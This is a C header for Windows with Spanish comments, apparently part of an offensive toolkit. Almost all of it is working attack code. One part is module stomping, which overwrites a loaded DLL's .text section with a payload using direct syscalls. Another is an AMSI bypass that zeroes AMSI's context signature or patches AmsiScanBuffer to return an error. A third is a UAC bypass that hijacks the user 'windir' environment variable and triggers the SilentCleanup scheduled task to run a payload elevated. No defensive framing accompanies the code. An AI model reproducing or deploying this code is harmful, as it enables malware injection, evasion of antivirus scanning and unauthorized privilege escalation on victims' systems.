#ifndef ADVANCED_BYPASS_H
#define ADVANCED_BYPASS_H

#include <windows.h>
#include <winternl.h>
#include <shellapi.h>
#include <stdio.h>
#include "api_hashes.h"
#include "syscalls.h"

// =============================================================================
// ESTRUCTURAS PARA MANUAL MAPPING Y MODULE STOMPING
// =============================================================================

typedef struct _STOMP_CONTEXT {
    PVOID BaseAddress;
    SIZE_T RegionSize;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_SECTION_HEADER TextSection;
    PVOID OriginalText;
    PVOID PayloadBuffer;
} STOMP_CONTEXT, *PSTOMP_CONTEXT;

// =============================================================================
// MAPEO MANUAL DE DLL LIMPIA DESDE DISCO
// =============================================================================

static PVOID MapCleanDll(_In_ LPCWSTR dllName, _Out_ PSIZE_T mappedSize) {
    WCHAR sysPath[MAX_PATH];
    UINT sysLen = GetSystemDirectoryW(sysPath, MAX_PATH);
    if (!sysLen || sysLen >= MAX_PATH) return NULL;
    
    if (sysPath[sysLen - 1] != L'\\') {
        sysPath[sysLen++] = L'\\';
        sysPath[sysLen] = L'\0';
    }
    
    SIZE_T nameLen = wcslen(dllName);
    if (sysLen + nameLen >= MAX_PATH) return NULL;
    memcpy(sysPath + sysLen, dllName, (nameLen + 1) * sizeof(WCHAR));
    
    HANDLE hFile = CreateFileW(sysPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;
    
    HANDLE hSection = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hSection) return NULL;
    
    PVOID pMapping = MapViewOfFile(hSection, FILE_MAP_READ | FILE_MAP_EXECUTE, 0, 0, 0);
    CloseHandle(hSection);
    
    if (pMapping && mappedSize) {
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMapping;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pMapping + pDos->e_lfanew);
        *mappedSize = pNt->OptionalHeader.SizeOfImage;
    }
    
    return pMapping;
}

// =============================================================================
// MODULE STOMPING: SOBRESCRIBIR .TEXT DE DLL CARGADA CON PAYLOAD
// =============================================================================

static BOOL InitializeStompContext(_Out_ PSTOMP_CONTEXT ctx, _In_ LPCWSTR targetDll, _In_ SIZE_T payloadSize) {
    ZeroMemory(ctx, sizeof(STOMP_CONTEXT));
    
    HMODULE hModule = LoadLibraryW(targetDll);
    if (!hModule) return FALSE;
    
    ctx->BaseAddress = (PVOID)hModule;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    ctx->NtHeaders = pNt;
    
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            ctx->TextSection = &pSection[i];
            ctx->RegionSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }
    
    if (!ctx->TextSection) {
        return FALSE;
    }
    
    if (payloadSize > ctx->RegionSize) {
        return FALSE;
    }
    
    ctx->OriginalText = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ctx->RegionSize);
    if (!ctx->OriginalText) {
        return FALSE;
    }
    memcpy(ctx->OriginalText, (PBYTE)hModule + ctx->TextSection->VirtualAddress, ctx->RegionSize);
    
    return TRUE;
}

static BOOL StompPayload(_Inout_ PSTOMP_CONTEXT ctx, _In_ PVOID payload, _In_ SIZE_T payloadSize) {
    if (!ctx || !ctx->BaseAddress || !payload || !payloadSize) return FALSE;
    
    PVOID pText = (PBYTE)ctx->BaseAddress + ctx->TextSection->VirtualAddress;
    ULONG oldProtect = 0;
    SIZE_T regionSize = ctx->RegionSize;
    
    // Usar syscall directa para cambiar protección
    NTSTATUS status = InvokeSyscall(
        g_ApiTable.NtProtectVirtualMemory.ssn,
        g_SyscallGadget,
        GetCurrentProcess(),
        &pText,
        &regionSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );
    
    if (status != 0) return FALSE;
    
    memset(pText, 0x90, ctx->RegionSize);
    memcpy(pText, payload, payloadSize);
    
    regionSize = ctx->RegionSize;
    InvokeSyscall(
        g_ApiTable.NtProtectVirtualMemory.ssn,
        g_SyscallGadget,
        GetCurrentProcess(),
        &pText,
        &regionSize,
        oldProtect,
        &oldProtect
    );
    
    return TRUE;
}

static VOID CleanupStompContext(_Inout_ PSTOMP_CONTEXT ctx) {
    if (!ctx) return;
    
    if (ctx->OriginalText) {
        if (ctx->BaseAddress && ctx->TextSection) {
            PVOID pText = (PBYTE)ctx->BaseAddress + ctx->TextSection->VirtualAddress;
            ULONG oldProtect = 0;
            SIZE_T regionSize = ctx->RegionSize;
            
            InvokeSyscall(
                g_ApiTable.NtProtectVirtualMemory.ssn,
                g_SyscallGadget,
                GetCurrentProcess(),
                &pText,
                &regionSize,
                PAGE_EXECUTE_READWRITE,
                &oldProtect
            );
            
            memcpy(pText, ctx->OriginalText, ctx->RegionSize);
            
            regionSize = ctx->RegionSize;
            InvokeSyscall(
                g_ApiTable.NtProtectVirtualMemory.ssn,
                g_SyscallGadget,
                GetCurrentProcess(),
                &pText,
                &regionSize,
                oldProtect,
                &oldProtect
            );
        }
        HeapFree(GetProcessHeap(), 0, ctx->OriginalText);
    }
    ZeroMemory(ctx, sizeof(STOMP_CONTEXT));
}

// =============================================================================
// BYPASS AMSI — DATA-ONLY ROBUSTO
// =============================================================================

static BOOL BypassAMSI_DataOnlyRobust() {
    LDR_DATA_TABLE_ENTRY_PTR *pMod = NULL;
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;
    PVOID hAmsi = NULL;
    
    while (pEntry != pHead) {
        pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
        if (pMod->BaseDllName.Buffer) {
            if (pMod->BaseDllName.Buffer[0] == L'a' && pMod->BaseDllName.Buffer[1] == L'm' && pMod->BaseDllName.Buffer[2] == L's' && pMod->BaseDllName.Buffer[3] == L'i') {
                hAmsi = pMod->DllBase;
                break;
            }
        }
        pEntry = pEntry->Flink;
    }
    
    if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hAmsi;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hAmsi + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    PVOID pDataStart = NULL;
    SIZE_T dataSize = 0;
    PVOID pRdataStart = NULL;
    SIZE_T rdataSize = 0;
    
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, ".data", 5) == 0) {
            pDataStart = (PBYTE)hAmsi + pSection[i].VirtualAddress;
            dataSize = pSection[i].Misc.VirtualSize;
        }
        if (memcmp(pSection[i].Name, ".rdata", 6) == 0) {
            pRdataStart = (PBYTE)hAmsi + pSection[i].VirtualAddress;
            rdataSize = pSection[i].Misc.VirtualSize;
        }
    }
    
    if (pDataStart && dataSize > 0) {
        PDWORD_PTR pScan = (PDWORD_PTR)pDataStart;
        for (SIZE_T i = 0; i < (dataSize / sizeof(DWORD_PTR)) - 1; i++) {
            if (pScan[i] && !IsBadReadPtr((PVOID)pScan[i], sizeof(DWORD))) {
                if (pScan[i] >= (DWORD_PTR)pRdataStart && pScan[i] < (DWORD_PTR)pRdataStart + rdataSize) {
                    if (*(PDWORD)pScan[i] == 0x49534D41) { // 'AMSI'
                        pScan[i] = 0;
                        return TRUE;
                    }
                }
            }
        }
    }
    
    // Fallback: Parcheo directo de AmsiScanBuffer
    PVOID pAmsiScanBuffer = GetProcAddress((HMODULE)hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer) {
        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
        ULONG oldProtect = 0;
        SIZE_T patchSize = sizeof(patch);
        PVOID pPatchAddr = pAmsiScanBuffer;
        
        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, GetCurrentProcess(), &pPatchAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, GetCurrentProcess(), &pPatchAddr, &patchSize, oldProtect, &oldProtect);
        return TRUE;
    }
    
    return FALSE;
}

// =============================================================================
// BYPASS UAC — SILENTCLEANUP CON SINCRONIZACIÓN ROBUSTA
// =============================================================================

static BOOL BypassUAC_SilentCleanupRobust(_In_ LPCWSTR payloadPath) {
    if (!payloadPath) return FALSE;
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) return FALSE;
    
    WCHAR originalWindir[MAX_PATH] = {0};
    DWORD origSize = sizeof(originalWindir);
    DWORD origType = 0;
    BOOL hasBackup = (RegQueryValueExW(hKey, L"windir", NULL, &origType, (LPBYTE)originalWindir, &origSize) == ERROR_SUCCESS);
    
    WCHAR buffer[MAX_PATH * 4];
    swprintf_s(buffer, MAX_PATH * 4, L"cmd.exe /c \"%s\" && SET windir=%%SystemRoot%%", payloadPath);
    
    RegSetValueExW(hKey, L"windir", 0, REG_SZ, (LPBYTE)buffer, (DWORD)(wcslen(buffer) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);
    
    SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L"Environment", SMTO_ABORTIFHUNG, 5000, NULL);
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = L"schtasks.exe";
    sei.lpParameters = L"/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /i";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    
    if (ShellExecuteExW(&sei)) {
        WaitForSingleObject(sei.hProcess, 10000);
        CloseHandle(sei.hProcess);
    }
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (hasBackup) RegSetValueExW(hKey, L"windir", 0, origType, (LPBYTE)originalWindir, origSize);
        else RegDeleteValueW(hKey, L"windir");
        RegCloseKey(hKey);
    }
    
    SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L"Environment", SMTO_ABORTIFHUNG, 5000, NULL);
    return TRUE;
}

#endif
